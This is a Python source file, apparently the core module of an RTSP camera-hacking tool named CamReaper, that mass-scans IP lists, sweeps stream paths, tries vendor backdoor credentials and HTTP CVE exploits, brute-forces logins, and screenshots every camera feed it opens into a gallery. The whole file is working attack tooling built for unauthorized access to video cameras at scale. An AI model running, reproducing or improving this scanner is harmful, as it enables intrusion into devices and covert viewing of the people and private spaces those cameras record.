"""Asynchronous RTSP scanner: host filter -> route -> credentials -> screenshot.

Every host is handled by an independent coroutine; a global semaphore bounds
the number of in-flight network host-pipelines (instead of thousands of
blocking threads).  Screenshots happen in a bounded process pool so FFmpeg
decoding never stalls the event loop.

Semantics:

* Only an RTSP ``200`` confirms a route.
* ``401``/``403`` means "host is alive and requires auth" - it is passed on to
  credential bruting even when no route is confirmed.
* Only a *confirmed working* stream (a route returning ``200`` with the right
  credentials) is recorded.
"""

import asyncio
import sys
from dataclasses import dataclass, field
from pathlib import Path

from CamReaper import report
from CamReaper.report import record_failed, record_gallery, record_http_cve, record_no_auth, record_url
from CamReaper.rtsp import RTSPClient
from CamReaper.vendor import detect_vendor

DUMMY_ROUTE = "/0x8b6c42"

# After this many consecutive transport failures (read timeouts / dropped
# sockets - NOT a 401/403) a host is abandoned: a camera that accepts but goes
# silent mid-brute would otherwise burn ~two socket timeouts per credential.
MAX_TRANSPORT_FAILS = 2

# Ports of one host probed at the same time.  Most targets in a large scan are
# dead, and probing the ports one after another costs timeout-per-port per
# host; 4 keeps the socket count sane while cutting that wait ~4x.
PORT_PARALLEL = 4

AUTH_CODES = {"401", "403"}

# A route walk is abandoned when the host has failed to answer on MORE THAN HALF
# of the routes it has actually probed, and only once at least this many
# failures have piled up.  The rule used to be "MAX_TRANSPORT_FAILS consecutive
# timeouts and the walk is over", which was implicitly tuned for the 11-entry
# default wordlist where a stripe walks one or two routes.  With an 800-entry
# list a stripe walks ~100 routes, and two hanging paths in a row - which plenty
# of cameras do on paths they do not serve - silently discarded everything
# below that point, so the tail of a long wordlist was never probed and a
# *longer* route list found *fewer* cameras.
#
# A rate separates "this camera hangs on some paths" from "this host is gone",
# and it keeps the fast bail-out for a genuinely mute camera: a dead host fails
# every probe, so the ratio trips within the first few routes.  Tolerance grows
# as the walk proceeds, because each answer proves the host is alive - a hang
# burst late in a long walk is far less suspicious than one at its very start.
_MUTE_EVIDENCE = 4


class _FailureBudget:
    """Give-up rule for a route walk, based on the *rate* of transport failures.

    ``fail()`` returns True when the walk must be abandoned.  ``max_consecutive``
    is the caller's ``--max-transport-fails`` and acts as a floor: a handful of
    failing paths never costs the walk, so raising the flag buys tolerance
    rather than being silently ignored.
    """

    __slots__ = ("_floor", "_probed", "_failed")

    def __init__(self, max_consecutive: int) -> None:
        self._floor = max(int(max_consecutive), _MUTE_EVIDENCE)
        self._probed = 0
        self._failed = 0

    def ok(self) -> None:
        """The host answered this route (a 404 or a hang-up counts as alive)."""
        self._probed += 1
        self._failed = 0

    def fail(self) -> bool:
        """Record one transport failure; True when the walk must be abandoned."""
        self._probed += 1
        self._failed += 1
        if self._failed < self._floor:
            return False
        return self._failed * 2 > self._probed


def _is_mute_host(client: RTSPClient, code: str) -> bool:
    """True when the host took the connection but never answered the request.

    Only a *timeout* is expensive: the socket is open, so every further route
    costs a full socket timeout.  A refused connection, or a socket the camera
    hangs up on without a reply, is its cheap way of saying "no such route" -
    and plenty of cameras answer every wrong route exactly like that.  Those
    must never abort a route sweep, otherwise a stream served only under an
    unusual path (Hikvision query routes, DVR channel paths, ...) is never
    reached.
    """
    if code:
        return False  # any status code - 404 included - is the host talking
    return client.last_error == "timeout"


@dataclass
class Found:
    ip: str
    port: int
    route: str
    credentials: str
    vendor: str = "Generic"
    is_http_cve: bool = False  # True for HTTP CVE hits (no RTSP URL)
    cve_id: str = ""  # CVE id when found via an HTTP CVE probe

    def url(self) -> str:
        return RTSPClient.get_rtsp_url(self.ip, self.port, self.credentials, self.route)


@dataclass
class Settings:
    ports: list = field(default_factory=lambda: [554])
    routes: list = field(default_factory=list)
    credentials: list = field(default_factory=list)
    timeout: float = 2.0
    host_concurrency: int = 200
    failed_with_error: bool = False
    screenshot_concurrency: int = 20
    pics_dir: Path = field(default_factory=lambda: Path("pics"))
    enable_screenshots: bool = True
    screenshot_timeout: float = 10.0
    max_attempts: int = 0
    max_transport_fails: int = 2
    attempts_per_sec: float = 0.0
    host_timeout: float = 0.0  # 0 = unlimited; wall-clock cap for one host
    route_parallel: int = 8  # 0 = serial
    status_interval: float = 5.0  # seconds between live status callbacks
    mode: str = "brute"  # "brute" | "cve" | "combined"
    cve_db: object = None  # CVEDatabase instance or None
    http_timeout: float = 5.0  # timeout for CVE HTTP probes
    http_ports: list = field(default_factory=lambda: [80, 443, 8080])
    no_http: bool = False  # disable HTTP CVE-probe fallback
    onvif: bool = False  # discover stream URLs over ONVIF instead of guessing
    onvif_ports: list = field(default_factory=list)  # empty = onvif.ONVIF_PORTS
    onvif_timeout: float = 5.0
    onvif_profiles: int = 4
    onvif_creds: list = field(default_factory=list)  # empty = onvif defaults


async def try_auth(client: RTSPClient, cred: str, route: str):
    """One authenticated DESCRIBE tolerant of dropped keep-alive sockets.

    Returns ``(status_code, still_connected)``.
    """
    if not client.is_connected and not await client.connect(client.port):
        return "", False
    ok = await client.authorize(client.port, route, cred)
    if not ok:
        # Camera closed the connection - retry once on a fresh socket.
        if await client.connect(client.port):
            ok = await client.authorize(client.port, route, cred)
    return client.status_code, client.is_connected


async def _verify_stream(
    ip: str, port: int, route: str, cred: str, timeout: float,
) -> bool:
    """Confirm that a discovered (port, route, credential) really plays.

    Used for streams whose origin did not come from our own probing - currently
    only the ONVIF stage.  A device's ``GetStreamUri`` answer is not proof: a
    profile can be configured but disabled, and a stale URL is still returned.
    One authenticated DESCRIBE separates the two.
    """
    probe = RTSPClient(ip, port, timeout, cred)
    try:
        if not await probe.connect():
            return False
        code, _still = await try_auth(probe, cred, route)
        return code == "200"
    except Exception:
        return False
    finally:
        probe.close()


async def _reconnect(client: RTSPClient, attempts: int = 3) -> bool:
    """Open a fresh connection, retrying a few times on transient TCP failure.

    Handles the immediate-reconnect flap right after ``close()`` (half-open
    socket, server backlog, network blip) with a short bounded retry.  It does
    NOT try to wait out a prolonged anti-brute lockout - that is handled at the
    caller level by throttling how often we open fresh connections.
    """
    pause = 0.15
    for _ in range(attempts):
        if client.is_connected:
            return True
        if await client.connect(client.port):
            return True
        await asyncio.sleep(pause)
        pause = min(pause * 2, 0.6)
    return False


async def _probe_routes_serial(
    client: RTSPClient, routes, cred: str, deadline=None,
    max_transport_fails: int = MAX_TRANSPORT_FAILS,
):
    """Return the first route that yields 200 with ``cred`` (or None).

    A fresh TCP connection is used for every route once the current one has
    answered 401: many cameras (Hikvision among them) start refusing even
    their open routes mid-session after a burst of 401s on the SAME socket,
    but happily serve them 200 on a brand-new connection.  The socket is reset
    lazily so hosts that answer 200 immediately stay on the fast keep-alive
    path.
    """
    need_fresh = False
    budget = _FailureBudget(max_transport_fails)
    loop = asyncio.get_running_loop()
    for route in routes:
        if deadline is not None and loop.time() >= deadline:
            return None
        if need_fresh:
            client.close()
            need_fresh = False
        if not client.is_connected and not await _reconnect(client):
            # A dropped connect is not proof the host is gone - the camera's
            # accept backlog can overflow under our own parallel stripes.
            if budget.fail():
                return None
            continue
        code, _ = await try_auth(client, cred, route)
        if code == "200":
            return route
        if code in AUTH_CODES:
            need_fresh = True
            budget.ok()
            continue
        if _is_mute_host(client, code):
            # Socket open, nothing came back: count it, but only abandon the
            # walk once the host is failing most of what we probe.
            if budget.fail():
                return None
            continue
        # A definitive status code - 404 included - means the host is talking.
        budget.ok()
        # No status line, but a closed/refused socket: the camera hung up on us,
        # which is its normal "no such route" answer.  Reconnect and keep going.
        client.close()
    return None


async def _sweep_routes(
    ip: str, port: int, timeout: float, routes, cred: str, parallel: int,
    deadline=None, first_only: bool = True,
    max_transport_fails: int = MAX_TRANSPORT_FAILS,
) -> list:
    """Probe ``routes`` in parallel stripes; return the routes that answered 200.

    ``parallel`` stripes are split round-robin over the route list and each
    stripe walks its own routes on a fresh connection (a camera that answered
    401 refuses even its open route on the same socket, so a new connection per
    route is what keeps the sweep reliable).  Workers - and therefore concurrent
    connections and in-flight tasks - stay bounded by ``parallel`` instead of
    growing with the route list, which matters on the 800+-route wordlist.

    With ``first_only`` the sweep stops as soon as one route opens.
    """
    routes = list(routes)
    hits: list = []
    if not routes:
        return hits
    workers = min(parallel, len(routes)) if parallel > 1 else 1
    loop = asyncio.get_running_loop()
    stop = asyncio.Event() if first_only else None
    lock = asyncio.Lock()

    async def _stripe(stripe_routes):
        client = RTSPClient(ip, port, timeout, ":")
        budget = _FailureBudget(max_transport_fails)
        try:
            for route in stripe_routes:
                if stop is not None and stop.is_set():
                    return
                if deadline is not None and loop.time() >= deadline:
                    return
                client.close()
                if not await client.connect(port):
                    # A failed connect is NOT proof the host is gone: `workers`
                    # stripes opening sockets simultaneously overflow a camera's
                    # tiny accept backlog and the kernel drops our SYN.  It used
                    # to `return` here, discarding the ~100 routes this stripe
                    # had left over a single dropped connection.  Account for it
                    # like any other transport failure instead.
                    if budget.fail():
                        return
                    continue
                code, _ = await try_auth(client, cred, route)
                if code == "200":
                    async with lock:
                        hits.append(route)
                    budget.ok()
                    if stop is not None:
                        stop.set()
                        return
                    continue
                if code in AUTH_CODES:
                    budget.ok()
                elif _is_mute_host(client, code):
                    # The socket is open and the camera stayed silent: this is
                    # the one failure that costs a full timeout, so count it -
                    # but a couple in a row must not throw away the rest of a
                    # long wordlist.
                    if budget.fail():
                        return
                else:
                    # No status line, but the camera hung up on us (or the
                    # route is a plain 404): that is its cheap "no such route"
                    # answer, so the stripe keeps going instead of giving up.
                    budget.ok()
        except Exception:
            pass
        finally:
            client.close()

    stripes = [routes[i::workers] for i in range(workers)]
    tasks = [asyncio.create_task(_stripe(stripe)) for stripe in stripes]
    await asyncio.gather(*tasks, return_exceptions=True)
    if hits:
        # Report hits in route order, not in completion order, so the result
        # does not depend on which stripe got lucky.
        order = {route: i for i, route in enumerate(routes)}
        hits.sort(key=lambda route: order.get(route, len(routes)))
    return hits


async def _probe_routes(
    client: RTSPClient, routes, cred: str, route_parallel: int, deadline=None,
    max_transport_fails: int = MAX_TRANSPORT_FAILS,
):
    """First route that answers 200 with ``cred``, reusing ``client`` if serial."""
    if route_parallel <= 1:
        return await _probe_routes_serial(
            client, routes, cred, deadline, max_transport_fails
        )
    hits = await _sweep_routes(
        client.ip, client.port, client.timeout, routes, cred, route_parallel,
        deadline, first_only=True, max_transport_fails=max_transport_fails,
    )
    return hits[0] if hits else None


async def probe_first_open_route(
    ip: str, port: int, timeout: float, routes, cred: str = ":",
    parallel: int = 0, deadline=None,
    max_transport_fails: int = MAX_TRANSPORT_FAILS,
):
    """Return the first of ``routes`` that answers 200 on ``ip:port`` (or None).

    Standalone variant of :func:`_probe_routes` that does not need a
    pre-connected client - used by the CVE engine, which works on its own
    sockets.  ``parallel <= 1`` means serial.
    """
    if parallel <= 1:
        client = RTSPClient(ip, port, timeout, ":")
        try:
            if not await client.connect(port):
                return None
            return await _probe_routes_serial(
                client, routes, cred, deadline, max_transport_fails
            )
        finally:
            client.close()
    hits = await _sweep_routes(
        ip, port, timeout, routes, cred, parallel, deadline, first_only=True,
        max_transport_fails=max_transport_fails,
    )
    return hits[0] if hits else None


async def probe_all_routes(
    client: RTSPClient, routes, creds, route_parallel: int = 0
) -> list:
    """Return EVERY route (from ``routes``) that answers 200 on ``client``.

    Used by ``--scan-channels`` to discover all open streams of one confirmed
    camera - unlike :func:`_probe_routes` (which stops at the first hit) this
    keeps the whole set so a multi-channel DVR yields every channel, not just
    one.

    Each route is tried on a fresh connection with ``creds``.  ``route_parallel``
    bounds concurrency (<=1 = serial).  Only plain ``200`` responses count; 401s
    and transport failures are skipped.  Returns the list of open routes (each
    starting with ``/``), possibly empty.
    """
    if not routes:
        return []
    return await _sweep_routes(
        client.ip, client.port, client.timeout, routes, creds,
        max(1, route_parallel), first_only=False,
    )


def _failure_reason(client: RTSPClient, code: str) -> str:
    """Short human-readable reason for a reachable-but-unconfirmed port.

    Cheap: everything here is already tracked by the scan (no extra work),
    which is why surfacing the error does not slow the run.
    """
    if code:
        return f"rtsp-{code}"
    return client.last_error or "no-response"


async def _probe_port(ip: str, port: int, timeout: float):
    """Classify one RTSP port of a host.

    Returns ``(state, client, vendor)`` where ``state`` is one of:
      * ``closed``      - nothing listening (client already discarded);
      * ``unconfirmed`` - the socket opened but no valid RTSP answer arrived;
      * ``open``        - no credentials needed and ``/`` is confirmed;
      * ``gate``        - 200 on a dummy route but ``/`` is gated;
      * ``auth``        - answered 401/403, i.e. it wants credentials.
    """
    client = RTSPClient(ip, port, timeout, ":")
    if not await client.connect(port):
        return "closed", client, ""
    await client.authorize(port, DUMMY_ROUTE, ":")
    code = client.status_code
    # The camera answers 200 to an arbitrary (dummy) route, so it needs no
    # password.  But only ``rtsp://ip:port/`` is recorded once ``/`` itself is
    # actually confirmed - a camera that 200s on the dummy yet gates ``/``
    # (Hikvision-style query-route cameras, etc.) must not produce a bogus
    # open-stream URL.  Such a host is kept as ``live`` and left to the
    # no-credential route sweep to pin down for real.
    # (Note: some cameras close the socket right after answering, so the
    # confirming probe can fail at the transport level even for healthy hosts -
    # never treat that as a reason to skip the host.)
    if code == "200":
        await client.authorize(port, "/", ":")
        if client.status_code == "200":
            return "open", client, detect_vendor(client.data)
        return "gate", client, detect_vendor(client.data)
    if code in AUTH_CODES:
        return "auth", client, detect_vendor(client.data)
    return "unconfirmed", client, ""


async def _probe_ports(ip: str, s: Settings) -> list:
    """Probe every configured port of one host, up to ``PORT_PARALLEL`` at once.

    Returns the per-port ``(state, client, vendor)`` tuples **in port order**,
    so which port wins does not depend on which answer came back first.  Most
    targets in a large scan have all their ports closed, and doing that one
    port after another costs a full socket timeout per port per host.
    """
    ports = list(s.ports)
    if not ports:
        return []
    if len(ports) == 1:
        return [await _probe_port(ip, ports[0], s.timeout)]

    results: dict = {}
    cursor = 0

    async def _worker():
        nonlocal cursor
        while True:
            index = cursor
            if index >= len(ports):
                return
            cursor = index + 1
            results[index] = await _probe_port(ip, ports[index], s.timeout)

    workers = min(PORT_PARALLEL, len(ports))
    await asyncio.gather(
        *(asyncio.create_task(_worker()) for _ in range(workers))
    )
    return [results[i] for i in range(len(ports))]


async def _handle_host(ip: str, s: Settings, stats: dict = None) -> list:
    """Run the full pipeline for one IP.  Returns a list of Found streams.

    ``stats`` (optional) is a mutable dict mutated in place for counters that
    machinery outside ``_guard`` needs to update (cve_tested, http_checked).
    """
    found: list = []

    # ---- stage 1: find a live port that "responds" (200/401/403) ----
    # Ports are probed concurrently and then judged in the order the user asked
    # for them, so the winner never depends on which answer came back first.
    results = await _probe_ports(ip, s)
    live: RTSPClient = None
    vendor = "Generic"
    open_port = None  # (client, vendor) for a passwordless confirmed stream
    winner = -1
    for index, (state, client, port_vendor) in enumerate(results):
        if state == "open":
            winner, open_port = index, (client, port_vendor or "Generic")
            break
        if state in ("auth", "gate"):
            winner, live, vendor = index, client, port_vendor or "Generic"
            break
        if state == "unconfirmed":
            # Port was open (TCP established) but no valid RTSP response came
            # back - a reachable-but-unconfirmed host.  Only these are logged,
            # and only when the user opted in via --failed-file.
            await record_failed(
                ip, client.port,
                _failure_reason(client, "") if s.failed_with_error else "",
            )
        client.close()
    # Release the sockets of the ports that lost the race.
    for index, (_state, client, _vendor) in enumerate(results):
        if index != winner:
            client.close()

    if open_port is not None:
        found.append(Found(ip, open_port[0].port, "/", ":", open_port[1]))
        open_port[0].close()
        return found

    if live is None:
        # No live RTSP port.  In 'cve'/'combined' mode, fall back to probing
        # the configured HTTP/HTTPS ports for CVE exploits on the device's web
        # panel (e.g. Hikvision/Dahua config disclosure, RCE endpoints).
        # Skipped when the user disabled HTTP probing, or no CVE db is loaded.
        if (
            not s.no_http
            and s.mode in ("cve", "combined")
            and s.cve_db
            and s.http_ports
        ):
            from CamReaper.cve import probe_http_host

            # Probe the web-panel ports concurrently.  Serially, a host with no
            # live RTSP port cost one full timeout *per HTTP port* back to back,
            # which made --mode cve many times slower than --mode brute on the
            # same target list - even though the ports are independent.
            async def _probe_http(hport):
                return await probe_http_host(
                    ip, hport, s.cve_db, s.http_timeout, stats
                )

            for found_here in await asyncio.gather(
                *(_probe_http(hp) for hp in s.http_ports)
            ):
                found.extend(found_here or ())
        return found

    # A pathological camera (accepts the port but stalls mid-brute) must not
    # occupy its host slot for ~one timeout per credential.  Enforce a
    # wall-clock budget and give up early on repeated transport failures.
    loop = asyncio.get_running_loop()
    deadline = loop.time() + s.host_timeout if s.host_timeout > 0 else None

    # ---- stage 2: find a route that works without credentials ----
    # Sweep the FULL route list without credentials.
    # Many cameras (e.g. Hikvision) answer 200 on a specific query route such
    # as "/cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif" while
    # returning 401 on the common ones - they are "open" but only on that route.
    # Skipping this sweep means finding fewer cameras: such a host would
    # otherwise drop straight into credential bruting, fail, and be reported
    # as not found although no password was ever needed.
    #
    # The sweep is still bounded: a per-host wall-clock deadline caps the total
    # work, and a host that stalls at the transport level (timeout / socket
    # dropped mid-request) is abandoned after a couple of failures so a silent
    # camera doesn't grind the whole route list.
    route = await _probe_routes(
        live, ["/"] + list(s.routes), ":", s.route_parallel, deadline,
        s.max_transport_fails,
    )
    if route:
        found.append(Found(ip, live.port, route, ":", vendor))
        live.close()
        return found

    # ---- stage 2.5: ONVIF stream discovery ----
    # Only reached when the cheap RTSP route sweep came up empty, so the fast
    # path (a camera that answers "/" straight away) pays nothing for it.  ONVIF
    # runs over HTTP on its own port and needs no guessing, so a device found
    # here is a *stream*, not a lead.
    if s.onvif:
        from CamReaper.onvif import discover, parse_stream_uri

        try:
            res = await discover(
                ip,
                ports=s.onvif_ports or None,
                timeout=s.onvif_timeout,
                creds=s.onvif_creds or None,
                max_profiles=s.onvif_profiles,
            )
        except Exception:
            res = None
        for st in (res.streams if res else []):
            parsed = parse_stream_uri(st.uri, st.credentials)
            if not parsed:
                continue
            _host, dport, droute = parsed
            # The device said this URI is a stream; confirm it over RTSP before
            # reporting it, so a device that hands out a stale or profile-only
            # URL cannot pad the report with results that do not play.
            if not await _verify_stream(ip, dport, droute, st.credentials, s.timeout):
                continue
            found.append(Found(ip, dport, droute, st.credentials, vendor))
            if stats is not None:
                stats["onvif_found"] = stats.get("onvif_found", 0) + 1
            live.close()
            return found

    # ---- stage 3: CVE exploits (vendor-specific backdoors & HTTP probes) ----
    # "Generic" is no longer excluded: the CVE database ships a shared
    # factory-default credential list for unidentified devices, and the vendor-
    # specific http_probe entries are harmless to try against any web panel.
    if s.mode in ("cve", "combined") and s.cve_db:
        from CamReaper.cve import run_cve_stage

        cve_found = await run_cve_stage(
            ip, live, vendor, s.cve_db, s.route_parallel, s.http_timeout,
            stats, http_ports=s.http_ports, routes=s.routes,
        )
        for f in cve_found:
            found.append(f)
            if stats is None:
                continue
            if f.is_http_cve:
                # A vulnerable web panel is not a stream: counted by the
                # caller in http_found, not in cve_found.
                continue
            stats["cve_found"] = stats.get("cve_found", 0) + 1
        if any(not f.is_http_cve for f in cve_found):
            # A confirmed RTSP stream from a backdoor credential: the host is
            # done.  HTTP-only hits deliberately fall through to stage 4, so a
            # vulnerable web panel never suppresses the brute-force of a host
            # that also answers RTSP.
            live.close()
            return found

    # ---- stage 4: brute-force credentials ----
    if s.mode == "cve":
        # CVE-only mode: skip brute-force entirely.
        live.close()
        if not found:
            await record_no_auth(ip, live.port)
        return found
    attempts = 0
    transport_fails = 0
    need_fresh = False
    next_allowed = 0.0
    interval = 1.0 / s.attempts_per_sec if s.attempts_per_sec > 0 else 0.0
    for cred in s.credentials:
        if s.max_attempts and attempts >= s.max_attempts:
            break
        if deadline is not None and loop.time() >= deadline:
            break
        if need_fresh or not live.is_connected:
            if need_fresh:
                # connect() would reuse the live socket - force a new one.
                live.close()
            if not await _reconnect(live):
                # connection unrecoverable - give up on this host
                break
            need_fresh = False
        attempts += 1
        if interval:
            now = loop.time()
            if now < next_allowed:
                await asyncio.sleep(next_allowed - now)
            next_allowed = max(now, next_allowed) + interval
        code, live_ok = await try_auth(live, cred, "/")
        if code == "200":
            found.append(Found(ip, live.port, "/", cred, vendor))
            live.close()
            return found
        if code == "404":
            # Credentials are valid, route is wrong - sweep routes for a 200.
            good = await _probe_routes(live, s.routes, cred, s.route_parallel, deadline,
                                       s.max_transport_fails)
            if good:
                found.append(Found(ip, live.port, good, cred, vendor))
                live.close()
                return found
            # Valid creds but no working route -> NOT a confirmed stream.
            live.close()
            return found
        if code in AUTH_CODES:
            # Clean 401/403 - next credential goes on a fresh connection, since
            # some cameras start refusing valid credentials mid-session after a
            # burst of 401s on the same socket.
            transport_fails = 0
            need_fresh = True
        elif _is_mute_host(live, code):
            # Socket open, nothing came back: don't grind every remaining
            # credential through a camera that is up but mute.  (A clean 401
            # that just closes the socket afterwards is NOT a mute - many
            # cameras do that and the next credential legitimately reconnects.)
            transport_fails += 1
            if transport_fails >= s.max_transport_fails:
                break
        elif code:
            # A real status code (404 handled above, 4xx/5xx here): the unit is
            # answering, so keep trying credentials on a fresh connection.
            transport_fails = 0
            need_fresh = True
        else:
            # No status line, but the camera hung up on us: its cheap "no such
            # route" answer, not a flake.  Reconnect and try the next
            # credential - this is what a camera that closes the socket after
            # every 401 looks like, and bailing out here loses the whole list.
            need_fresh = True

    live.close()
    if not found:
        # A live RTSP port was confirmed (it challenged us with 401/403) but no
        # open route and no credential in the list opened a stream.  Only the
        # user opted in via --no-auth-file is this recorded; these are few
        # (real, confirmed cameras we couldn't open), not the closed ports.
        await record_no_auth(ip, live.port)
    return found


async def _screenshot_worker(queue: asyncio.Queue, s: Settings, counter: dict):
    from CamReaper import screenshot

    while True:
        found: Found = await queue.get()
        if found is None:
            queue.task_done()
            break
        try:
            if s.enable_screenshots:
                url = found.url()
                # Hikvision multi-channel expansion.
                if "/Streaming/Channels/101/" in url:
                    got = False
                    for i in range(1, 17):
                        variant = url.replace(
                            "/Streaming/Channels/101/", f"/Streaming/Channels/{i}01/"
                        )
                        pic = await screenshot.capture(
                            variant, s.pics_dir, s.screenshot_timeout
                        )
                        if pic:
                            got = True
                            await record_gallery(variant, f"pics/{Path(pic).name}")
                    # got=False means no channel yielded a frame: the stream is
                    # confirmed (found) but undecodable via PyAV.
                    counter["screenshots"] += int(got)
                    counter["found_no_frame"] += int(not got)
                else:
                    pic = await screenshot.capture(
                        url, s.pics_dir, s.screenshot_timeout
                    )
                    counter["screenshots"] += int(bool(pic))
                    counter["found_no_frame"] += int(not bool(pic))
                    if pic:
                        await record_gallery(url, f"pics/{Path(pic).name}")
        except asyncio.CancelledError:
            raise
        except Exception:
            # A failing capture or report write must cost this one frame, not
            # the worker: a dead worker would silently stop the gallery.
            counter["errors"] += 1
        finally:
            queue.task_done()


async def run(iter_targets, s: Settings, on_counter=None, on_status=None) -> dict:
    """Drive the whole scan.  ``iter_targets`` is an async iterator of IPs.
    Returns a stats dict.

    Hosts are scheduled in bounded batches (at most one pending task per
    host-concurrency slot) instead of eagerly creating a task per target - so
    a multi-million-IP list does not balloon memory or freeze the loop.

    ``on_counter`` is called as ``on_counter(stats, ip)`` once per finished
    host.  ``on_status`` (if given) receives an info dict about every 5s so a
    caller can render a live status line without fighting a progress bar;
    without it the watchdog prints one line per tick.
    """
    sem = asyncio.Semaphore(s.host_concurrency)
    # Bounded: hosts hand their capture to the workers and wait when the queue
    # is full, so a fast scan cannot pile up frames faster than they are shot.
    result_queue: asyncio.Queue = asyncio.Queue(
        maxsize=max(4 * s.screenshot_concurrency, 16)
    )

    stats = {
        "checked": 0,
        "found": 0,
        "screenshots": 0,
        "found_no_frame": 0,  # confirmed stream whose capture returned no frame
        "vendors": {},  # vendor -> count of confirmed streams
        "ports": {},  # port -> count of confirmed streams
        "cve_found": 0,  # streams found via CVE exploits
        "cve_tested": 0,  # CVE exploits tested
        "http_checked": 0,  # HTTP ports probed for CVE exploits
        "http_found": 0,  # HTTP ports with matched CVE exploits
        "errors": 0,  # hosts that raised instead of being classified
        # First few failures, verbatim: a swallowed exception is a host that
        # silently produces no findings, so it has to stay visible.
        "error_samples": [],
    }
    # ip -> monotonic start time of the in-flight host pipeline, so the
    # watchdog can surface a stalled tail instead of a silent trickle.
    inflight: dict = {}
    loop = asyncio.get_running_loop()
    run_started = loop.time()

    async def _guard(ip):
        t_start = loop.time()
        inflight[ip] = t_start
        try:
            async with sem:
                try:
                    found = await _handle_host(ip, s, stats)
                    for f in found or ():
                        if f.is_http_cve:
                            # HTTP CVE hit: not an RTSP stream - log it to the
                            # http_cve file and count it separately.
                            stats["http_found"] += 1
                            await record_http_cve(ip, f.port, f.cve_id)
                        else:
                            stats["found"] += 1
                            await record_url(f.url())
                            await result_queue.put(f)
                            vendors = stats["vendors"]
                            vendors[f.vendor] = vendors.get(f.vendor, 0) + 1
                            ports = stats["ports"]
                            ports[str(f.port)] = ports.get(str(f.port), 0) + 1
                except asyncio.CancelledError:
                    raise
                except Exception as exc:
                    # One bad host - a malformed wordlist line, a full disk, a
                    # camera answering something unparseable - must not end a
                    # scan that may still have hours to go.  Count it, keep
                    # going, and keep the first few messages so a run that
                    # quietly finds nothing can be diagnosed afterwards.
                    stats["errors"] += 1
                    if len(stats["error_samples"]) < 5:
                        stats["error_samples"].append(
                            f"{ip}: {type(exc).__name__}: {exc}"
                        )
                stats["checked"] += 1
                if on_counter:
                    on_counter(stats, ip)
        finally:
            inflight.pop(ip, None)

    async def _watchdog():
        def green(s):  # minimal ANSI color helper for the progress line
            if not sys.stdout.isatty():
                return s
            return f"\033[32m{s}\033[0m"

        try:
            while True:
                await asyncio.sleep(s.status_interval)
                now = asyncio.get_running_loop().time()
                elapsed = now - run_started
                if inflight:
                    longest = max(inflight, key=inflight.get)
                    oldest = f"{longest} ({(now - inflight[longest]):.0f}s)"
                else:
                    oldest = "-"
                info = {
                    "elapsed": elapsed,
                    "checked": stats["checked"],
                    "found": stats["found"],
                    "screenshots": stats["screenshots"],
                    "inflight": len(inflight),
                    "oldest": oldest,
                }
                if on_status is not None:
                    on_status(info)
                else:
                    print(
                        f"[worker] elapsed={info['elapsed']:.0f}s "
                        f"checked={green(info['checked'])} "
                        f"found={green(info['found'])} "
                        f"screenshots={green(info['screenshots'])} "
                        f"inflight={info['inflight']} oldest={oldest}"
                    )
        except asyncio.CancelledError:
            raise

    workers = []
    for _ in range(s.screenshot_concurrency):
        t = asyncio.create_task(_screenshot_worker(result_queue, s, stats))
        workers.append(t)

    watchdog = asyncio.create_task(_watchdog())
    pending = []
    gen = iter_targets.__aiter__()
    try:
        while True:
            while len(pending) < s.host_concurrency:
                try:
                    ip = await gen.__anext__()
                except (StopAsyncIteration, AttributeError):
                    break
                pending.append(asyncio.create_task(_guard(ip)))
            if not pending:
                break
            done, pending_set = await asyncio.wait(
                pending, return_when=asyncio.FIRST_COMPLETED
            )
            for task in done:
                # _guard swallows host errors itself; only cancellation escapes.
                task.result()
            pending = list(pending_set)
        # Normal end of the scan: let the capture workers finish every frame
        # still queued before we tear them down.
        for _ in workers:
            await result_queue.put(None)
        await asyncio.gather(*workers)
    finally:
        aclose = getattr(gen, "aclose", None)
        if aclose is not None:
            await aclose()
        if not watchdog.done():
            watchdog.cancel()
            await asyncio.gather(watchdog, return_exceptions=True)
        # Safety net for the error/cancel path: never leave workers pending.
        for t in workers:
            if not t.done():
                t.cancel()
        await asyncio.gather(*workers, return_exceptions=True)

    if on_status is None and on_counter is None:
        # Standalone use (tests / embedding): print a plain summary.
        print(
            f"[done] elapsed={loop.time() - run_started:.0f}s "
            f"checked={stats['checked']} found={stats['found']} "
            f"screenshots={stats['screenshots']} errors={stats['errors']}"
        )
    await report.close_report_files()  # flush + create any pending report files
    return stats
